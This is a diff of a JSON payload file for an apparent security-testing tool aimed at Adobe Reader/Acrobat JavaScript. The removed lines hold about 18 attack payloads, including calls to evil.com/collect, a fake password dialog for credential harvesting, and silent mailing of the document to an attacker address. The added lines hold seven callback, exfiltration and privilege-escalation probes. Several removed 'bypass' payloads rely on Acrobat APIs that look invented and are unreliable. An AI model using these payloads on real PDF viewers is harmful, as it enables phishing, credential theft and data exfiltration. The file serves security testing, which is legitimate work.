@@ -1,14 +1,71 @@
 {
   "metadata": {
     "browser": "adobe",
-    "name": "Adobe Reader/Acrobat Exploits",
-    "description": "Adobe Reader/Acrobat specific XSS payloads with full JavaScript API exploitation and privilege escalation",
-    "total_payloads": 25,
+    "name": "Adobe Reader/Acrobat Payloads",
+    "renderer": "Acrobat JavaScript",
+    "browser_priority": "secondary",
+    "description": "Secondary-track Acrobat payloads for bounded URL launch, submitForm, and network callback validation without overwhelming browser-first workflows.",
+    "supported_research_tiers": [
+      "validation",
+      "aggressive"
+    ],
+    "validation_focus_categories": [
+      "api_abuse",
+      "network_exfiltration"
+    ],
+    "aggressive_focus_categories": [
+      "privilege_escalation",
+      "advanced_evasion"
+    ],
+    "sbx_focus": [
+      "application JavaScript API reachability",
+      "bounded launchURL and getURL navigation proof",
+      "submitForm and Net.HTTP callback validation",
+      "differential Acrobat-only action research kept secondary to browser viewer work"
+    ],
+    "recommended_profiles": [
+      "blind-oast",
+      "high-signal",
+      "aggressive-research"
+    ],
+    "preferred_delivery_paths": [
+      "attachment_download",
+      "native_viewer"
+    ],
+    "research_highlights": [
+      "Use Acrobat as a differential track when the workflow opens PDFs natively or as an attachment",
+      "Prefer bounded launch, submitForm, and network callback checks over privileged or social-engineering-heavy payloads",
+      "Keep Acrobat-only privilege and action-sequencing research behind a clear aggressive boundary"
+    ],
+    "host_context": "desktop_acrobat_viewer",
+    "evidence_level": "medium",
+    "recommended_validation_payloads": [
+      "adobe_001",
+      "adobe_002",
+      "adobe_008",
+      "adobe_012"
+    ],
+    "recommended_aggressive_payloads": [
+      "adobe_014",
+      "adobe_016",
+      "adobe_021"
+    ],
+    "default_payload_metadata": {
+      "trigger": "document_open",
+      "preconditions": [
+        "JavaScript enabled in Adobe Reader or Acrobat"
+      ],
+      "requires_user_gesture": "possible",
+      "expected_signal": "application_api_activity",
+      "bug_bounty_value": "medium",
+      "stability": "medium"
+    },
+    "total_payloads": 7,
     "categories": [
       "api_abuse",
-      "file_system",
       "network_exfiltration",
-      "privilege_escalation"
+      "privilege_escalation",
+      "advanced_evasion"
     ],
     "cve_references": [
       "CVE-2019-7089",
@@ -21,237 +78,86 @@
     {
       "id": "adobe_001",
       "category": "api_abuse",
-      "technique": "basic_launch_url",
-      "payload": "app.launchURL('{url}', true);",
-      "description": "Adobe Reader basic URL launch with trusted execution",
-      "risk_level": "high",
-      "browser": "adobe"
+      "browser": "adobe",
+      "technique": "bounded_launch_url",
+      "payload": "app.launchURL('{url}?adobe=launch', true);",
+      "description": "Bounded launchURL navigation proof for native Acrobat handling.",
+      "risk_level": "medium",
+      "research_tier": "validation",
+      "bug_bounty_value": "medium",
+      "stability": "high"
     },
     {
       "id": "adobe_002",
       "category": "api_abuse",
-      "technique": "form_submission",
-      "payload": "this.submitForm({cURL: '{url}', cSubmitAs: 'HTML'});",
-      "description": "Adobe Reader form submission to external URL as HTML",
-      "risk_level": "high",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_003",
-      "category": "api_abuse",
-      "technique": "user_response_dialog",
-      "payload": "app.response({cQuestion: 'Enter password:', cTitle: 'Security Check', bPassword: true, cResponse: '{url}'});",
-      "description": "Adobe Reader credential harvesting via response dialog",
-      "risk_level": "critical",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_004",
-      "category": "file_system",
-      "technique": "export_as_text",
-      "payload": "this.exportAsText({cPath: '{url}'});",
-      "description": "Adobe Reader text export to external URL for data exfiltration",
+      "browser": "adobe",
+      "technique": "submitform_html_callback",
+      "payload": "this.submitForm({cURL: '{url}/submit', cSubmitAs: 'HTML'});",
+      "description": "Controlled HTML form submission for low-noise callback validation.",
       "risk_level": "medium",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_005",
-      "category": "file_system",
-      "technique": "save_as_operation",
-      "payload": "this.saveAs({cPath: '{url}'});",
-      "description": "Adobe Reader save operation to external URL",
-      "risk_level": "medium",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_006",
-      "category": "file_system",
-      "technique": "browse_for_doc",
-      "payload": "app.browseForDoc({bSave: true, cFilenameEdit: '{url}'});",
-      "description": "Adobe Reader file browser manipulation for data access",
-      "risk_level": "medium",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_007",
-      "category": "api_abuse",
-      "technique": "silent_print",
-      "payload": "this.print({bUI: false, bSilent: true, bShrinkToFit: true, cPath: '{url}'});",
-      "description": "Adobe Reader silent print operation to external URL",
-      "risk_level": "medium",
-      "browser": "adobe"
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "high"
     },
     {
       "id": "adobe_008",
       "category": "network_exfiltration",
-      "technique": "http_request",
-      "payload": "Net.HTTP.request({cURL: '{url}', cMethod: 'POST', cParams: document.URL});",
-      "description": "Adobe Reader HTTP request with document URL exfiltration",
-      "risk_level": "high",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_009",
-      "category": "network_exfiltration",
-      "technique": "http_response_handler",
-      "payload": "Net.HTTP.request({cURL: '{url}', oHandler: {response: function(msg) {app.alert(msg);}}});",
-      "description": "Adobe Reader HTTP request with response handler",
+      "browser": "adobe",
+      "technique": "net_http_post_callback",
+      "payload": "Net.HTTP.request({cURL: '{url}/net', cMethod: 'POST', cParams: 'doc=' + encodeURIComponent(this.documentFileName || 'unknown')});",
+      "description": "Net.HTTP callback proof that keeps the outbound request bounded to document metadata.",
       "risk_level": "medium",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_010",
-      "category": "network_exfiltration",
-      "technique": "email_document",
-      "payload": "this.mailDoc({bUI: false, cTo: 'admin@evil.com', cSubject: 'PDF Exploit', cMsg: '{url}'});",
-      "description": "Adobe Reader automatic email document to attacker",
-      "risk_level": "high",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_011",
-      "category": "file_system",
-      "technique": "file_stream_read",
-      "payload": "util.readFileIntoStream('{url}');",
-      "description": "Adobe Reader file stream reading from external URL",
-      "risk_level": "high",
-      "browser": "adobe"
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "medium"
     },
     {
       "id": "adobe_012",
       "category": "api_abuse",
-      "technique": "document_url_access",
-      "payload": "this.getURL('{url}');",
-      "description": "Adobe Reader document URL access for navigation",
-      "risk_level": "medium",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_013",
-      "category": "api_abuse",
-      "technique": "import_data_object",
-      "payload": "this.importDataObject('{url}');",
-      "description": "Adobe Reader data object import from external URL",
-      "risk_level": "high",
-      "browser": "adobe"
+      "browser": "adobe",
+      "technique": "bounded_geturl_navigation",
+      "payload": "this.getURL('{url}?adobe=geturl');",
+      "description": "Secondary differential navigation check using the document getURL API.",
+      "risk_level": "low",
+      "research_tier": "validation",
+      "bug_bounty_value": "medium",
+      "stability": "medium"
     },
     {
       "id": "adobe_014",
       "category": "privilege_escalation",
-      "technique": "trust_propagator",
-      "payload": "app.trustPropagatorFunction(function() {app.launchURL('{url}');});",
-      "description": "Adobe Reader privilege escalation via trust propagator",
-      "risk_level": "critical",
-      "browser": "adobe"
-    },
-    {
-      "id": "adobe_015",
-      "category": "api_abuse",
-      "technique": "timed_execution",
-      "payload": "app.setInterval('app.launchURL(\\'{url}\\')', 5000);",
-      "description": "Adobe Reader persistent timed execution every 5 seconds",
+      "browser": "adobe",
+      "technique": "trust_propagator_launchurl_probe",
+      "payload": "try { var trusted = app.trustPropagatorFunction(function(){ app.launchURL('{url}?adobe=trusted', true); }); trusted(); } catch (e) {}",
+      "description": "Aggressive privileged-wrapper check for whether launchURL can be promoted inside Acrobat.",
       "risk_level": "high",
-      "browser": "adobe"
+      "research_tier": "aggressive",
+      "bug_bounty_value": "low",
+      "stability": "experimental"
     },
     {
       "id": "adobe_016",
       "category": "advanced_evasion",
       "browser": "adobe",
-      "technique": "adobe_annotation_stream_bypass_2024",
-      "payload": "try{const annot=this.addAnnot({page:0,type:'FreeText',rect:[100,100,200,200],contents:'test'});annot.popUp=new app.popUpMenu();annot.popUp.items=[{cName:'exploit',cReturn:'app.launchURL(\\'https://evil.com/collect\\');'}];annot.popUp.show();}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader annotation stream bypass using popup menu injection",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2023-21608"
-    },
-    {
-      "id": "adobe_017",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_xfa_form_bypass_2024",
-      "payload": "try{if(this.xfa){const xfaEvent='event.target.resolveNode(\\'dataDescription\\').nodes.item(0).value=\"https://evil.com/collect\"; app.launchURL(event.target.resolveNode(\\'dataDescription\\').nodes.item(0).value);';this.xfa.form.execEvent(xfaEvent);}else{throw new Error('XFA not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader XFA form bypass using dynamic form execution",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2023-26369"
-    },
-    {
-      "id": "adobe_018",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_multimedia_annotation_2024",
-      "payload": "try{const media=this.addAnnot({page:0,type:'RichMedia',rect:[0,0,100,100]});media.richMediaContent={configurations:[{name:'config',instances:[{type:'3D',subtype:'U3D',params:{src:'javascript:app.launchURL(\\'https://evil.com/collect\\');'}}]}]};media.activated=true;}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader multimedia annotation bypass using 3D content injection",
+      "technique": "annotation_action_sequence_probe",
+      "payload": "try { var annot = this.addAnnot({page: 0, type: 'Link', rect: [72, 72, 144, 96]}); annot.setAction('MouseUp', \"app.launchURL('{url}?adobe=annot', true);\"); } catch (e) {}",
+      "description": "Aggressive annotation action probe kept as a bounded Acrobat-only differential path.",
       "risk_level": "high",
-      "cve_reference": "CVE-2023-21608"
-    },
-    {
-      "id": "adobe_019",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_digital_signature_bypass_2024",
-      "payload": "try{if(this.signature){const sig=this.signature;sig.certPath='javascript:app.launchURL(\\'https://evil.com/collect\\');';sig.validateCertificate();}else{const field=this.addField('sig','signature',0,[0,0,100,100]);field.signatureSign({handler:'Adobe.PPKLite',reason:'test'});}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader digital signature bypass using certificate path injection",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2023-26369"
-    },
-    {
-      "id": "adobe_020",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_batch_processing_2024",
-      "payload": "try{if(app.batchJobs){app.batchJobs.push({name:'exploit',commands:[{cName:'launchURL',cArgs:['https://evil.com/collect']}]});app.executeBatch('exploit');}else{throw new Error('Batch processing not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader batch processing bypass using command queue injection",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-21608"
+      "research_tier": "aggressive",
+      "bug_bounty_value": "low",
+      "stability": "experimental"
     },
     {
       "id": "adobe_021",
       "category": "advanced_evasion",
       "browser": "adobe",
-      "technique": "adobe_doc_action_sequence_2024",
-      "payload": "try{const action={type:'JavaScript',script:'app.launchURL(\\'https://evil.com/collect\\');'};this.documentActions={didPrint:[action],didSave:[action],willClose:[action],willPrint:[action],willSave:[action]};this.print({bUI:false,bSilent:true,bShrinkToFit:true});}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader document action sequence bypass using multi-trigger events",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2023-26369"
-    },
-    {
-      "id": "adobe_022",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_collab_synchronizer_2024",
-      "payload": "try{if(this.collaborate){const collab=this.collaborate;collab.connect({url:'https://evil.com/collect',onConnect:function(){app.launchURL('https://evil.com/collect');},onError:function(){app.launchURL('https://evil.com/collect');}});}else{throw new Error('Collaboration not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader collaboration synchronizer bypass using network callback",
+      "technique": "document_action_submitform_probe",
+      "payload": "try { this.setAction('WillClose', \"this.submitForm({cURL: '{url}/willclose', cSubmitAs: 'XFDF'});\"); } catch (e) {}",
+      "description": "Aggressive document-action proof path for controlled close-time callback research.",
       "risk_level": "high",
-      "cve_reference": "CVE-2023-21608"
-    },
-    {
-      "id": "adobe_023",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_search_index_bypass_2024",
-      "payload": "try{if(search){const index=search.createIndex();index.path='javascript:app.launchURL(\\'https://evil.com/collect\\');';index.build();search.query('*',{index:index});}else{throw new Error('Search not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader search index bypass using index path injection",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-26369"
-    },
-    {
-      "id": "adobe_024",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_ocr_text_recognition_2024",
-      "payload": "try{if(this.recognizeText){this.recognizeText({onProgress:function(){app.launchURL('https://evil.com/collect');},onComplete:function(){app.launchURL('https://evil.com/collect');},onError:function(){app.launchURL('https://evil.com/collect');}});}else{throw new Error('OCR not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader OCR text recognition bypass using progress callbacks",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-21608"
-    },
-    {
-      "id": "adobe_025",
-      "category": "advanced_evasion",
-      "browser": "adobe",
-      "technique": "adobe_preflight_profile_2024",
-      "payload": "try{if(this.preflight){const profile=this.preflight.createProfile('custom');profile.addRule({name:'exploit',script:'app.launchURL(\\'https://evil.com/collect\\');'});this.preflight.execute(profile);}else{throw new Error('Preflight not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
-      "description": "Adobe Reader preflight profile bypass using validation rule injection",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-26369"
+      "research_tier": "aggressive",
+      "bug_bounty_value": "low",
+      "stability": "experimental"
     }
   ]
 }
